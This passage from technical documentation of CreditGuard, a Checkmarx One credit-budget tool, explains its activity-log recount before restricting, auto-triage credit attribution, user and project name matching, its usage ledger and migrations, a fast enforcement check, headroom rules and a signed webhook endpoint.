  page 1 to the end after the cycle's transaction has been committed (nothing
  is held open in the database across the calls), capped by the activity page
  cap (`activity.max_pages_per_cycle`; 400 pages when that is 0) and the
  cycle's time budget. Rows of a date met on both sides of a page boundary are
  counted at most as often as one page shows them: the recount can fall short,
  never count a row twice.
* **Who a row counts towards** is the activity source's own mapping: a project
  by id; an application by id and through the project's synced applications;
  a person by email or username through the existing resolver, following the
  [integration-account rule](#integration-accounts); a group through all its
  projects (and members, with member usage), whichever feed the ledger used. A row counts
  towards a person or an application only when every row of its identity names
  the same one, as in the ledger. Only rows dated inside the period, and after
  the budget was created, count.
* **When they disagree** nothing is restricted, the budget stays BREACHED, a
  WARNING (once per budget and period) says *Counts disagree: CreditGuard's
  count is X, a direct recount of the Checkmarx activity log is Y; not
  restricted. See Diagnose.*, and the disagreement is recorded (the newest 50,
  `recount.records`) for Diagnose's *Recount before restricting* check, which
  otherwise reads *No disagreements.*
* **When the recount cannot be done** (the log refuses or fails, the page cap
  or the time budget stops the read, anything errors) nothing new is
  restricted either, with a warning: the rule fails safe towards not
  restricting. The next cycle recounts again.
* **The same gate** applies to the safety ceilings (only what the recount
  would let start counts towards them; the log is read for that only when the
  ceiling would trip otherwise). The Simulation and the dry run do not read the
  log: they mark such a row *Would restrict if the recount agrees*
  (`recount_required` in `GET /api/preview/dry-run`).
* **Not affected:** restrictions already in force or started (re-asserted and
  lifted exactly as before), lifts and credit-increase restores, and lifetime,
  custom, count-existing and demo budgets, which keep today's rule.

#### Integration accounts

Integration accounts are automation, not people: `[bot]` accounts and known
bots, `Auto-triage`, `Auto-remediation` (and the other synthetic subjects),
handles the matcher takes for an integration, and the names an admin lists in
Settings → Attribution → *Integration accounts* (`attribution.integration_accounts`,
for an SCM integration's handle). Their usage always counts towards the budgets
of its project, and the project's groups and application, like any usage.
Towards a person:

* **if the event's project had an active project budget at the event's date**,
  towards no user budget: the project budget governs it. When each project
  budget may have been active is recorded at every activity write and every
  evaluation (`usage_budget_interval`), so the answer for a past event never
  changes, also for the auto-triage charges evaluation recomputes. A budget
  switched off and on again between two of those observations counts as
  active throughout (**not counted** towards the person then);
* otherwise `Auto-triage` goes to the person who started the scan through
  [auto-triage charging](#charging-auto-triage-to-the-person-who-started-the-scan)
  (when it is on and resolves one; nobody otherwise), and `Auto-remediation` to
  nobody (no initiator is traced for it). The project-budget rule also applies
  to those charges for what was observed while the log was the source;
* any other account becomes a subject under Settings → Attribution: an admin
  maps it to the person it acts for, or leaves it as its own subject and sets a
  user budget on it (the Budgets picker offers it as *name (integration
  account)*, entity id `subject:<name>`; such a budget is monitor only, there
  is nobody to restrict).

A project budget created mid-period applies from its creation on. An event is
never charged to two user budgets.

### The endpoint silently ignores an unrecognised `viewBy`

This is the trap worth knowing about. `viewBy=anything-at-all` does not fail: it
answers **HTTP 200 with the user dimension**. So a successful response is not
evidence that the dimension you asked for exists, and naive code will file user
consumption as project or application usage.

Support is therefore established by comparison, not by status code. Once per run,
the utility asks for a deliberately invalid `viewBy` to capture what the fallback
looks like, and a dimension whose subjects are identical to that fallback is marked
unsupported in `dimension_state` and never polled again. Both sides have to be non
empty for that conclusion, because a real but idle dimension legitimately returns
nothing, and two empty responses prove nothing.

Verified against a live tenant: `user`, `action`, `application`, `project` and
`group` are all real dimensions. `action` names each type in title case
(`Triage`, `Remediation`) with the lowercase `actionType` nested underneath.

### Auto Triage is reported as a pseudo-user

The user dimension includes a synthetic subject named `Auto-triage` carrying the
credits that automation spent. It is not a person, so it is never offered as an
unmatched user to map, and that row is never counted against a user limit. By
default that consumption belongs to the project only: it is counted there (and in
the project's application and groups) and tenant wide.

### Charging auto triage to the person who started the scan

Settings has an off-by-default switch, **Charge auto-triage credits to the person
who started the scan** (API field `charge_auto_triage_to_scan_initiator`, stored as
`attribution.auto_triage_to_scan_initiator`). With it on, each project's Auto
Triage credits are *additionally* counted against the synced Checkmarx user whose
scan triggered the auto triage, so their user limit (and a group limit that
includes member usage) reflects it. Project, application and tenant figures do not
change: they already contain those credits.

**The amount.** `A_p` is the project's Auto Triage credits in the newest believed
project reading. The feed reports per action *transactions*, not credits, so `A_p`
is the project's credits when Auto Triage is all it did, otherwise its Auto Triage
transactions priced at the tenant-wide credits per Auto Triage transaction from the
`action` dimension, but never more than the project's transaction-mix share (its
credits less what the mix attributes to its other actions). Without the tenant
price, a project row that also did other actions has no `A_p` at all (only a row
whose breakdown is Auto Triage alone keeps its credits): the mix share alone can
hand a person's own, dearer remediation credits to a scan initiator. The cap
matters when the tenant average says Auto Triage costs more than this project's
credits allow: the
difference would be other actions' credits, such as a person's own triage that
already counts against them, and it must not be charged to anyone a second time.
The cap is conservative: it can under-charge a project whose Auto Triage really is
dearer than its other actions, never over-charge. Only `A_p` is ever split between
people. What is charged to people for a project
never adds up to more than `A_p`; whatever cannot be placed stays on the project
only, exactly as with the switch off.

**Who is charged.** Each part of `A_p` gets a basis, shown wherever the figure is
explained:

| Basis | How |
| ----- | --- |
| **Observed** | Each cycle, a project whose Auto Triage *transaction count* rose since the last reading has its scans listed (`GET /api/scans/`) for that interval, less a 30 minute lag because auto triage runs after a scan completes. Only completed (or partial) scans on the project's auto-triage branches count; failed, canceled and running ones never do (branches are read from its AI configuration, *also when Auto Triage is switched off now*, so history from when it ran is still placed; no branches configured, an unreadable configuration, or one whose branches are not a list, means all branches). The new transactions, priced at the project's current credits per Auto Triage transaction, are split equally across those scans, so per person by number of scans. A scan an earlier charge of the project already names is not charged again: the lag reaches back into the previous interval, and a scan that completed in it took its share of that rise. It still counts in the split, and its share stays on the project, so late auto triage of it never lands on the other scans of the interval (a scan whose interval showed no rise is in no charge, so auto triage that really landed late is still placed). The listing gives no completion time, only `updatedAt`, which also moves when a scan is edited later (a tag, say): a scan whose `updatedAt` is more than 24 hours after its creation is taken for an old scan edited since, not one that just finished, and is not charged. With no scan in the interval, the latest such scan before it is used, but never one from before observation began, before the lookback window, before the previous charged interval ended, or one already charged. |
| **Estimated** | Credits from before the switch was turned on (the history). Split by how many completed scans each person ran on the auto-triage branches inside the lookback window before observation began (sampled once per project, newest 500 scans). Never more than what is left of that history: its *ceiling* is the transaction count observation began at, less every fall followed since (what ages out of the window is the oldest first, so a fall comes out of the history), priced at the project's current credits per transaction, and scaled by the share of the sampled history scans still inside the window. A fall only shows when more ages out than arrives in an interval; the dates of the history's scans show it ageing out either way, so the estimate shrinks as they leave the window even while new transactions keep the count up. |
| **Unattributed** | A rise with no qualifying scan at all, a remainder with no earlier scan to estimate against, whatever the charges and the history together do not explain (an interval that could not be read; an interval too busy to read, recorded as an unattributed charge so it is never estimated to the history; new transactions that arrived while older ones aged out, as far as the history estimate has shrunk with its scans leaving the window), the share of scans that have no initiator (a scheduler), and the share of scans an earlier charge already named: those scans count in the split, so the people who did start the other scans are only charged their own share. Stays on the project. New transactions netted against as many older ones ageing out are never seen as a rise, so nobody is charged for them: under-charging is the safe side. |

**What is followed.** The per project cursor is the Auto Triage *transaction count*
the feed reports, never a credit figure: the tenant-wide credits per transaction
moves from reading to reading, and a credit cursor would turn every wobble into a
"new" rise. No reading at all, leaving the cursor where it was so a dip is never
charged again when it comes back, is: a project missing from a reading; a row
without the per action breakdown, whatever its credits (a row with no credits and
no breakdown counts as 0 only while the cursor already stands at 0); an Auto
Triage `transactionCount` that is not a whole number of at least 0; and a breakdown
without an Auto Triage entry unless the other actions account for the row (at
least one with transactions, all readable, adding up to the reported total),
since a partial breakdown could have left Auto Triage out. Without a total to
confirm it, such a row counts as 0 only while the cursor already stands at 0;
otherwise the whole count would be charged again when the entry comes back. A real
fall (older transactions ageing out of the lookback window) moves the cursor down
without charging anything, and lowers the history ceiling by as much.

**When observation (re)starts.** Turning the switch on stamps an observation start
(`attribution.auto_triage_observation_epoch`, written whichever way the switch was
turned on, also by leaving demo mode, and kept in the database across restarts).
Every project whose cursor is from an earlier start, from another lookback window,
or from before the upgrade that introduced the transaction cursor starts again at
the current reading: what arrived while the switch was off is history, estimated
and never one big observed rise. A project first seen with consumption that earlier
readings already showed (it was missing from a reading or two) also starts there.
That includes readings where its row matched no project in the local catalogue
(created since the last organisation sync, a failed sync, a name or id mismatch),
which are stored without a project: an earlier unmatched row with the same reported
id or the same name counts, and so does any unmatched row the feed gave no id for,
since it cannot be told apart (that case is logged as a warning and counted in the
cycle's `restarted_unidentified` step figure, once per project). Only a project with no consumption in any earlier
reading has its first auto triage observed.

A scan's `initiator` is matched to a synced user exactly like a consumption
subject (admin mapping, then email, username, full name, then the conservative
fuzzy match). An initiator that matches nobody, typically an integration such as a
PR webhook that scans under its own name, is listed with the unmatched consumers on
Settings, marked as a **scan initiator** (`source: "scan_initiator"`), and its share
stays on the project until an admin maps it to the person it acts for. Mapping takes
effect for every past charge at once.

**Windows and periods.** Observed charges are dated (the reading that showed the
rise); estimated shares are not. Charges older than the lookback window drop out,
exactly as the reported figures do, and if older usage ages out so that the project
reports less than was charged inside the window, the charges are scaled down to fit.
Within a budget period the attributed part follows the same rule as the person's own
credits: a lifetime, custom or `count_existing_usage` limit counts everything
attributed inside the window, and a monthly or quarterly limit counts only charges
observed after its baseline was taken. So turning the switch on, or a new month
opening, does not suddenly bill months of old auto triage against a monthly budget.
A limit's detail shows the attributed part as it would count now (counted, not
counted and the per project parts all from the same rebuild); the period's
`credits_used` is from its last evaluation and catches up at the next cycle, for
example after an initiator is mapped (`evaluated_counted` shows what it included).

**Bounded and crash safe.** Listing is paged and capped
(`attribution.max_projects_per_cycle` projects and
`attribution.max_requests_per_cycle` requests per cycle, 150 and 600 by default;
500 scans per project interval). The work waiting longest goes first, new
increases and history estimates alike, so a capped cycle leaves the newest
work and nothing waits for ever; the step's record says how much is left
(`backlog`), how long the oldest has waited (`oldest_waiting_minutes`) and
within how many cycles each is reached at this backlog (`each_within_cycles`). Scans are listed newest
first by when they were created, so an interval is listed back to four hours before
it opened, enough for a long SAST scan of a large repository to finish inside it. The
listing does not ask the server to filter by date (the pages read are the same), so
the last page also carries a few scans created earlier; one of them that completed
inside the interval (and within 24 hours of its creation) is counted too. A scan
running longer than that and not on that page is not seen (its share goes to the
scans that are). Only a project with more than about a hundred scans an hour on its
auto-triage branches reaches the cap. When the cap is reached on a full page that
did not yet reach the interval's start, one more request for a single scan tells
whether anything was left unread, so exactly 500 scans is not reported as capped. A
project that does not fit is caught up on the next cycle and stays on the project
meanwhile; an interval whose unread scans could still include one that finished
inside it stays on the project rather than being split over a biased sample. Any
failure in one project,
a tenant error or anything unexpected, leaves that project's cursor where it was,
records the error on it, raises a warning, and the other projects carry on (an
outage stops the step for the cycle instead of waiting on every project). Nothing
else in the cycle is touched. No database lock is held while Checkmarx is called.

**Chargeback.** The chargeback report sums each limit's current-period figure by
business unit, so with the switch on a business unit whose limits cover people also
includes their attributed auto triage. A business unit that also holds a limit on
the project itself counts the same auto triage there too: the report shows what
each budget counts, not a de-duplicated tenant total. Use the project, application
or tenant figures for that.

**Enforcement implications.** Turning the switch on can push many people over budget
at once, especially on lifetime limits. The enforcement safety ceilings still apply:
if that cycle would start restricting more than the ceiling allows, it restricts
nobody and pauses enforcement for an admin to look. Look at the Simulation page
(every row shows its `auto_triage_attributed` part) before turning it on. The change
is audited with its before and after value. It is not part of the configuration
backup, for the same reason the enforcement safety settings are not: a restore must
never quietly change who is billed for what. The diagnostics page (and
`scripts/diagnose_usage.py`, section 6) explains a person's or a project's split.
The listing needs read access to scans (`GET /api/scans/`) for the API key.

### Attribution

The consumption feed identifies users by display name and email, not by id, and
inconsistently: some rows carry `email` and `userEmail`, some carry an address in
`name`, some carry only a display name, and some carry a service-style handle like
`cx-dave-dawson`. Attribution happens in two stages.

**Exact ladder first.** Email, then an email found in `name`, then username, then
unambiguous full name. Two people called "Bob Baker" never share a budget: an
ambiguous full name is not matched.

**Similarity for the tail** (`services/subject_matching.py`). A handle the ladder
cannot place is normalised to a token set — the `cx-` prefix stripped, an email
reduced to its local part — so `cx-dave-dawson`, `Dave Dawson` and
`dave.dawson@example.com` all reduce to `{dave, dawson}` and score against
every synced user. The score, deliberately conservative because a wrong match
bills the wrong person, decides:

| Confidence | Outcome |
| ---------- | ------- |
| **≥ 85%**, one clear winner | Attributed automatically and written to the audit log. Still overridable. |
| **≥ 60%**, or an auto-worthy near-tie between two people | Left **uncounted** and raised as a *dispute* with ranked suggestions to confirm on the Settings page. A subject that already counted towards a user and becomes disputed (a second person with the same name is synced) keeps counting there, flagged, until an admin resolves it. |
| below 60% | Unmatched, mapped by hand. Automation is told apart: handles with `[bot]` or a known bot handle (`dependabot`, `renovate`, `snyk-bot`, ...), and integration identities: no email, matching nobody, and a CI phrase in any case (`github-actions`, `GitHub-Actions`, `gitlab-ci`, `azure-pipelines`), an automation token as a whole lowercase part (`-bot`, `_bot`, `-ci`, `svc-`, `-svc`, ...), or, unless the handle is written like a person's name (dotted parts or a Capitalised part: "Paul.Scanner", "lee.sonar", "Mary-Build"), a build word as a whole part (`sonar-scanner`, `build-agent`, `buildserver01`) or a lowercase product or build name (`jenkins`, `gitlab-runner`). Digits, hyphens and underscores alone say nothing, and a token never matches inside a word: "jsmith2", "Jean-Luc", "mary_ann", "jenkinson", "Jenkins", "Runner", "Bob_Builder", "tokenaga", "Priya" and "张伟" stay people. It stays listed in the *Unmatched* tab, marked *Automation* and mappable, but is not chased as a person: no "could not be matched" notice, and one "new automation identity" notice instead, once per subject ever (`unresolved_subject.automation_noticed_at`; subjects already automation at the upgrade are marked without a notice). |

Nothing is ever dropped: every subject lands in `unresolved_subject` with its
status, and the Settings page groups them into **Disputes**, **Auto-matched** and
**Unmatched** tabs. An admin mapping always wins over the automatic decision.

Every page counts unmatched people the same way: not mapped, not auto-matched,
not automation (`ingestion.unresolved_person_filter`), and the "could not be
matched" notice is raised only for those. Project and application rows under a
name that is no synced project or application (on a live tenant, 87% of project
credits were under `org/repo` names absent from `/api/projects`) are counted in
the cycle record, on the Overview and in Diagnostics, and an admin can map a
name to a project or application under Settings → Attribution
(`/api/usage/unmatched-entities`, one row per name in `entity_mapping`); a real
name match always wins over a mapping, and a mapping to a project that is gone is
shown as broken and ignored.

#### Where a name's usage counts: the usage ledger

The feed reports, by name, cumulative totals over its lookback window. A period
budget never counts those totals: every live reading is turned into increases
(`app/services/ledger.py`), in the transaction that stores the reading and under
the attribution lock that a mapping takes too (a transaction-scoped advisory lock
on PostgreSQL, the write lock on SQLite). Neither is held across a call to
Checkmarx One, so a failed reading leaves nothing behind and the next one is
measured from the last reading that was stored.

* **A name's increase** is its total now minus its total in the previous live
  reading of the same view (per action type too). The same row served on two
  pages (the ranking shifting between page requests) is read once, never added
  up: rows are told apart by id or email, and a project's, application's or
  group's name is unique. Different rows of one subject (a person under their
  email and under their name) are added up. User rows with a display name only
  are added up when they come on one page (two people may share a name); one
  on a later page whose name an earlier page of the same reading already had is
  a repeat (the higher is kept, and the reading is doubted). How many such rows
  a subject was read as is kept on its row (`display_rows`); when it changes
  between readings (two people who share a display name split across a page
  boundary, or joined on one page), the totals are not comparable and that
  reading counts nothing for the subject. So two real people who share a display
  name lose what they spend in every interval where the page layout splits or
  joins them, and while they are split only the higher of the two is followed
  (the other's usage is not counted): an under-count, limited to subjects read
  as several display-name-only rows.
* **A fall** adds nothing. In a reading the completeness checks believe, it is
  taken as the lookback window rolling past older usage, and the name continues
  from its new total. This rests on a premise: a complete listing reports each
  name correctly. A per-name glitch in a reading the checks believe (one name
  reported low while the listing is complete and no collapse is under way)
  cannot be told from a roll-down, and its recovery is counted as usage. In a reading they doubt (a row served twice, or fewer rows than the
  feed says it has, counting rows the parser skips), the fall is not believed at
  once: the name continues from its previous total (`usage_missing_name`, kind
  `dip`) until it recovers or a believed reading confirms the fall. Each
  reading with held falls says so in the cycle's warnings, with the names, and
  Diagnose shows a *Doubted usage falls* check, for 3 doubted readings or 2
  hours, whichever comes first. After that the fall is no longer reported, but
  the total before it stays a ceiling (kind `ceiling`): only usage above it
  counts, until a believed reading confirms the lower total or the lookback
  horizon passes. A collapse of the whole feed that is accepted only because it
  persisted (3 readings over 2 hours) leaves the same ceiling on every name that
  fell, or is missing from it (kind `collapse`), also when that reading is
  doubted, and on a fall already held as doubted. The ceiling stays while the
  name is missing from later readings, is a rename partner meanwhile (a name
  that may be its rename, new or back, starts under the same ceiling), and is
  cleared only by rising above it or at the horizon. So an outlasting glitch is
  never counted when it ends; a real roll-down first
  reported in doubted readings, or in such a collapse, costs what the name adds
  below its old total (an under-count). A believed fall to a non-zero total
  counts as a rise for forgetting: the usage spent meanwhile may be in it.
* **A name missing from a reading** is remembered with its last total
  (`usage_missing_name`), so when it returns only what it reported since counts.
  It is forgotten once its total last rose, fell to a non-zero total or first
  appeared longer ago than the lookback window plus two days (`last_rise_at`,
  carried on every reading's rows). The rolling windows count by their length
  (`last_year` is taken as the last 365 days); `last_month`, the previous
  calendar month, can hold usage for up to 62 days; the two days cover windows
  counted in whole days:
  nothing it reported can be left in the window then, so its return counts in
  full. A name back after missing readings may have been renamed and renamed
  back: it starts from the highest of its own last total and those of the names
  it may have been meanwhile (its entity's remembered names, and any name that
  left within one org refresh plus an hour), so what another name already
  counted is never counted again; this can under-count a return in that
  reading.
* **A name never seen before counts in full**: it reported nothing in the
  previous reading, so all of its total is new. Unless it may be a rename: when
  it counts towards an entity, it starts from the highest last total of that
  entity's remembered names (however long ago they left, within the lookback
  window) and of unmatched names that left within one org refresh plus an hour
  (a rename the sync learnt first); when it counts towards nothing, from the
  highest of any names that left within one org refresh plus an hour. Per action
  type too. This applies whenever a project's or user's name changes, or another
  name leaves the feed as an unmatched one appears; it can under-count a really
  new name in that reading, never over-count.
  The very first reading, and a reading taken over another lookback window,
  count nothing: every total in them is history. A name missing at a change of
  lookback window starts from whatever it reports when it returns.
* **Each increase counts towards the entity the name counts towards at that
  moment** (`usage_delta`, one row per reading and name, unique, so a retried
  reading cannot count twice), and is added to the counter (`budget_usage`) of
  every active budget that entity feeds at that moment, for the period the
  reading was taken in: a user's, and the user's groups' that include members'
  usage; a project's, its groups' and its applications'. A group or application
  with a row of its own in its view's latest reading is fed by that row, and
  otherwise by its projects, decided once per ingest before any view is read; a
  group's or application's own row that is new, or back after missing readings,
  counts nothing in that reading nor in the next (its projects fed the budget
  meanwhile, up to their own read, which comes after the application's); a
  ceiling it was under stays. More generally, an own row feeds its budget only
  once its entity had one in both of the two readings before (a row mapped by an
  admin, or renamed in the feed before the sync, starts feeding a reading
  later); the reading in between counts towards neither (an under-count).
  Back on its projects, a budget whose own row left counts only project
  increases observed wholly after the row's last reading: an increase whose
  interval spans it (a project missing while the row counted what it spent, then
  back once the row has left) counts towards neither, since the row may have
  counted part of it already (an under-count of what that project spent after
  the row's last reading, in that interval only).
  Every active budget has a counter per month and per quarter, fed whatever its
  period type or setting: one that counts usage already reported (lifetime,
  custom, *count existing usage*) reads its totals instead, and switching it
  back to monthly or quarterly, or between monthly and quarterly, mid-period
  loses nothing. (Quarter counters of monthly budgets, and counters of budgets
  that counted existing usage, start at the upgrade that introduced them.) A
  budget switched off counts nothing while it is off.
* **An increase whose interval spans a budget's period start** (the reading
  before it was taken in an earlier period: downtime, demo mode or a skipped
  cycle across a rollover) cannot be split, so that budget counts none of it.
  An increase read before the rollover and evaluated after it counts towards the
  period it was read in; that period's figure is brought up to date when the
  next evaluation runs, with what arrived after it was last evaluated only, and
  never lowered: a later change of the budget's settings never rewrites a
  closed period.
* **Usage observed while a name counts towards nothing** (unmatched, deleted,
  disputed) is kept unattributed. It is claimed by the entity the name comes to
  match by its own name, only for what was observed in the org refresh plus an
  hour before that entity was first synced: a project or user created and used
  before the sync brought it keeps its first usage (not towards a budget
  created after that usage). A mapping, or resolving a dispute, settles it
  instead: it is never claimed, and the name counts from then on.

So a mapping, an unmapping, a correction, a rename in either order, a deletion
and return, a group or application membership change and demo mode only ever
move usage observed from then on, and no budget loses what it already counted.
The confirmation after a mapping says exactly that: "Usage reported under *X*
from now on counts towards *Y*. What it already counted towards *Z* stays
there." A disputed user match counts towards nobody until an admin resolves it;
what it counted before stays.

**Budgets that count usage already reported** (lifetime, custom, or *count
existing usage*), and demo budgets in demo mode, read the current totals of the
names that count towards them now, history included, by definition. Mapping a
name to such a budget's entity brings its history in, and unmapping it takes it
out again.

**What the ledger cannot know.** The feed gives no dates, so these are lost, by
construction, and never guessed: usage a name reported between its last reading
under one name and its first under a new one that could not be paired; what a
new name, or a name back, adds in the reading where it appears, when it may be
a rename;
increases hidden by the lookback window rolling past older usage in the same
interval; what a name adds while a doubted fall of it waits for confirmation
when the fall is real, and usage below a ceiling kept after an outlasting doubt
or a persisting collapse; usage in the reading after a change of lookback
window; an interval that spans a budget's period start; the reading in which a
group's or application's own row leaves its view, its second reading when it
appears, and the reading before an own row that starts matching its entity
feeds it; a project increase whose interval spans the last reading of an own
row that has since left; what two people who share a display name spend while the page layout
splits or joins them, and the lower one's usage while they are split; and usage observed while a name
counted towards nothing that no new entity claims.

The same increases drive the rest: usage after a restriction is the restricted
user's or project's increases since the restriction (each action type since its
own restriction, Fusion priced from the increases' Fusion models). An increase is
read between two readings and cannot be split, so the first one after a
restriction includes what was used between the reading before it and the
restriction itself (normally the seconds between a cycle's reading and its
enforcement). The action mix in notifications is the period counter's (or, when
an action's count stopped rising while another rose, the readings'); and Auto
Triage credits charged to people who scan use each project's readings shifted by
what names joining or leaving it brought (`usage_entity_offset`). Ledger rows
older than the retention window are pruned, except those of an entity with a
restriction in force; budget counters are pruned with their period states.

**Upgrading** (migration `b3e8d1f6a9c4`) seeds the counter of every budget
period still open with the usage it shows (its `credits_used`, less the Auto
Triage credits charged to people, which are added separately), so no open period
jumps or loses anything, remembers the names earlier readings had and the latest
lacks, and starts the ledger from the latest live reading. Migration
`e2a7c4f9b1d8` adds when each name last rose and the doubt count, and gives the
open period of every active budget that counts existing usage a counter: what
the rows of its own entity grew by up to the period's latest live reading, name
by name, from the highest total any earlier reading of the run gave it (the last
one before the period and every one in it, so a reading that reported a name
low is never the start; names in no earlier reading bring nothing), over the
readings since the lookback window last changed; zero for a budget fed by a
roll-up, or with fewer than two such readings. Migration `d5b1e8a3c7f2` adds
`usage_record.display_rows`. A database at the
unreleased usage-anchor revision `f9c1e4b7a2d3` (now an empty placeholder) loses
that schema's tables and columns on the way. **Downgrading** drops the ledger
tables; period budgets then count from the baseline their period opened with.
Migration `c9f2b6d4e8a1` adds the activity source's tables
(`usage_activity_key`, `usage_activity_state`) and seeds nothing: the first
cycle after upgrading only records what the activity log holds (see
[Switching source](#switching-source-and-what-is-not-counted)); downgrading
drops them, and the summary feeds every view again from its next reading but one.

**An organisation sync never deletes after a short listing.** Listings are read
to their reported total (`filteredTotalCount`, else `totalCount`), rows told
apart by id, even when the server caps its pages; without a total, a short page
is followed by one more request. A listing that still comes back short, or an
IAM user listing that reports a shortfall, deletes nothing and keeps everyone's
group and application links, with a warning. Some servers report a total that
counts rows the key cannot see: the same short listing (same ids, same total)
three times in a row is then taken as everything the key can see, said once. A
repeated page or the page limit never is. Groups come in one IAM call with no
count: more than one group and more than a fifth of them missing at once is
acted on only when the next sync misses the same groups. Every complete listing
is remembered (`org_sync.complete_listings`).

## Faster enforcement: the fast check, headroom and the webhook

**What "instant" can mean.** Credits appear in Checkmarx One only once it
**bills** an action, and a scan is usually billed when it finishes. So the scan
that takes a budget over its limit normally **completes**, whatever CreditGuard
does: by the time its credits are visible they are spent. The fast check makes
the restriction land seconds after the credits appear instead of minutes;
**headroom** is how to stop the scan that would overrun the budget, by
restricting while a few credits are still left. The webhook only makes the fast
check run at once when a scan ends; it never enforces anything itself.

### The fast check

`app/services/fastcheck.py`, a scheduler job of its own (`fast-check`), every
15 seconds by default (Settings → Schedule & data → *Fast check*: on/off, 10 to
300 seconds). The full cycle keeps its own interval and stays the source of
truth. Each tick:

1. **Reads the tail of the activity log**: from where its last read ended (in
   this process; the activity source's cursor after a restart), a little earlier
   for rows that aged out meanwhile, to the end. Normally **one request**; two
   when the tail crosses a page boundary (500 rows); at most 4 pages, the rest
   left to the cycle. No database transaction is open while Checkmarx is called,
   and the read is under the cycle's pacing (a time budget of 120 seconds).
2. **Counts new events through the activity source's own code**
   (`activity_source._reconcile` and `_count`, under the attribution lock): the
   same multiset rule, the same paging rule (a date met at a page boundary
   waits), so a row is counted once whichever read sees it first, the fast check
   or the cycle. It does not move the activity source's cursor: the next cycle
   reads everything again and finds nothing new.
3. **Evaluates only the budgets those events fed** that are now at or over where
   they restrict (their limit, or inside their headroom), with
   `evaluation.evaluate_all(only=...)`: the same pause and watch-only state,
   safety ceilings, `summary_hold`, recount and blast-radius rules as a cycle,
   and none of its housekeeping (no verification pass, no sweep, no settling of
   closed periods). Already-restricted and monitor-only budgets already
   announced are skipped; a budget whose restriction the recount refused is
   tried by a fast check at most every 5 minutes (each cycle tries it anyway).

**Never at the same time as a cycle.** It holds the cycle's own lock
(`scheduler_lock`, holder `fastcheck:…`) and skips the tick when the lock is
busy. A cycle that finds a fast check holding it waits for it (up to 150
seconds) instead of skipping, and no fast check starts while a cycle waits.

**When it does nothing:** turned off, the scheduler off, **demo mode** (demo
data is never read from a tenant), the usage source *Summary only*, or the
activity log not the source right now (a fallback to the summary). Summary
totals never restrict anyway.

**The safety ceiling** counts per cycle. So that several fast checks between
two cycles cannot together start more than one cycle may, a fast check also
counts the budgets and targets that started restricting over the last cycle
interval and leaves anything beyond the ceiling to the full cycle (which applies
its own, and trips the breaker as before).

**What it costs** (measured with the fake tenant in `tests/test_fastcheck.py`):

| | At 15 seconds |
| --- | --- |
| Checkmarx requests, nothing restricted | 1 per tick, 2 when the tail crosses a 500-row page: **240 to 480 an hour** (`requests_per_hour` on the Settings card). |
| When a budget starts restricting | plus the recount's read of the period (as in a cycle) and the restriction's own writes. |
| Database writes per tick, nothing new | **2 single-row UPDATEs of `scheduler_lock`** (take and release), nothing else: no cycle record, no status row (`test_no_database_writes_when_nothing_changed`). The status is written when something happened, and otherwise at most every 5 minutes. |
| Database writes per tick, new events | the activity source's own counting writes (keys seen, the budget counters), as a cycle would make for the same rows. |

**Status.** Diagnose shows *Fast check: last run, last action*; the Settings
card shows the same. A tick creates no `scheduler_run` row.

### Headroom: restrict before the budget runs out

Per budget, optional, off by default (`credit_limit.headroom_credits` and
`headroom_auto`, migration `c8f2a6d4e1b7`). One rule for every caller
(`app/services/headroom.py`): the evaluation, the recount gate, the Simulation
and dry run, the safety ceiling and the lift on a credit increase:

```
restrict_at = credit_limit - headroom
restricted when credits_used >= restrict_at    (remaining <= headroom)
lifted     when credits_used <  restrict_at    (remaining >  headroom)
```

With no headroom `restrict_at` is the limit: exactly the behaviour before.
Remaining exactly equal to the headroom counts as inside it, as usage exactly at
the limit always counted as over it.

* **Fixed**: *Restrict early when less than N credits are left*. Must be smaller
  than the limit; at most `limit - 1` credits are ever held back, so a headroom
  never restricts a budget nobody has used.
* **Automatic**: the median cost of the budget's entity's **Fusion scans** over
  the last 30 days (a project's, a person's, an application's projects', a
  group's projects'), else the tenant-wide median when the entity has fewer than
  3, else none for now. At most half the limit. The budget form shows the number
  it chose and why. Scan costs come from the activity log as it counts (the
  `fusion_scan_cost` table: each new Fusion row added once to its scan, kept 30
  days), so an upgraded install has no automatic headroom until Fusion scans
  have been counted.
* **Messages.** A budget restricted inside its headroom says *Restricted early:
  X credits left, below the headroom of Y* (the breach notice, titled *… is
  nearly out of credits*, the evaluation note, the budget's period and its
  status *Restricted early*), never *over budget*. The Simulation says *Would
  restrict early*.
* **The recount** confirms `recount >= limit - headroom`.
* **Lifting.** Raising the budget so that more than the headroom is left lifts
  the restriction as any credit increase does (`credit_increased`); so does
  turning the headroom off or lowering it.

### The Checkmarx One webhook (optional)

`POST /api/webhooks/checkmarx` (`app/services/cx_webhook.py`). Off unless an
admin turns it on and creates a secret (Settings → Schedule & data → *Fast
check*); while off it answers 404.

**What Checkmarx One documents** (read on 27 November 2026):

* [Tenant-level Webhooks](https://docs.checkmarx.com/en/34965-378162-tenant-level-webhooks.html):
  a webhook has a name, an *Active* switch, a payload URL, an optional
  *Secret (for added security)*, SSL verification and events: **Completed
  Scan, Failed Scan, Partial Scan, Project Created**. No payload or header
  details on that page.
* [Configuring Projects → Webhooks](https://docs.checkmarx.com/en/34965-68538-configuring-projects.html)
  (project level): post-scan events only, `X-Cx-Webhook-Event:
  scan_completed_successfully` or `scan_failed`, `Content-Type:
  application/json`, and `X-Cx-Webhook-Signature: sha256=<value>`, described as
  the event data "encrypted using the sha256" with the webhook secret; the
  example value is base64 (`sha256=Jw9m7mG+…=`). The payload holds `scanId`,
  `projectId`, `projectName`, `correlationId`, `initiator`, `userAgent`,
  `sourceType`, `sourceOrigin`, `branch`, `mainBranch`, `repoURL` and
  `statusInfo` (one entry per scanner plus `general`, each with a status, and
  `loc` and `errorCode` where they apply).
* **There is no scan-started event**, and no documented retry, ping or
  replay protection. The header values of the tenant-level *Partial Scan* and
  *Project Created* events are not documented.

**What CreditGuard does with it.** A delivery is accepted only with a valid
`X-Cx-Webhook-Signature`: HMAC-SHA256 of the raw body keyed with the secret,
compared in constant time as base64 or hex (the documentation does not name the
encoding). Bodies over 64 KiB are refused (413), more than 60 deliveries a
minute too (429), unsigned or wrongly signed ones get 401; refusals are kept in
memory only, so nobody can make the app write to its database by posting
rubbish. A scan event (any event name containing `scan`, or a body with a
`scanId`) queues **one** fast check and returns 202 at once: no enforcement work
in the request, and a burst of deliveries coalesces into the single queued
check (never closer than 5 seconds to the previous one). *Project Created* is
accepted and ignored: nothing is billed. Nothing in the payload is trusted: the
project, scan and initiator are recorded as a hint for Diagnose only. The route
needs no session, so it carries no CSRF token: it is the only one, and it is
authenticated by the signature alone. Creating or replacing the secret is
